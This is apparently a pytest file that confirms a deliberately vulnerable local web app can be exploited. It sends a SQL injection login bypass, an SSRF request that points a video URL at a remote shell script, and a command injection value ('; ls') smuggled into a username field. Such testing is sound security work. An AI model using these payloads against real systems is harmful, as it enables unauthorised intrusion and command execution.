import pytest
import requests

def classic_sql():
    """
    Classic Sql injection Test
    """
    logindata = {"username": "\' OR \'1\'=\'1", "password": ""}

    with requests.Session() as s:
        req = s.post("http://localhost/login", data=logindata, allow_redirects=True)
        return b"admin:" in req.content

"""
SSRF Test
"""
def ssrf_request():
    logindata = {"username": "admin", "password": "admin"}
    SSRFdata = {"title": "PytestInjection", "videourl": "https://raw.githubusercontent.com/f1rehaz4rd/ritsecScripts/master/test.sh"}

    with requests.Session() as s:
        req = s.post("http://localhost/login", data=logindata, allow_redirects=True)
        uploadreq = s.get("http://localhost/upload", data=SSRFdata)

"""
Command Injection Test
"""
def command_injection():
    admin_data = {"username": "; ls"}

    with requests.Session() as s:
        req = s.post("http://localhost/adminpanel", data=admin_data, allow_redirects=True)
        return b"Dockerfile" in req.content

def test_vulns():
    assert classic_sql() == True
    assert command_injection() == True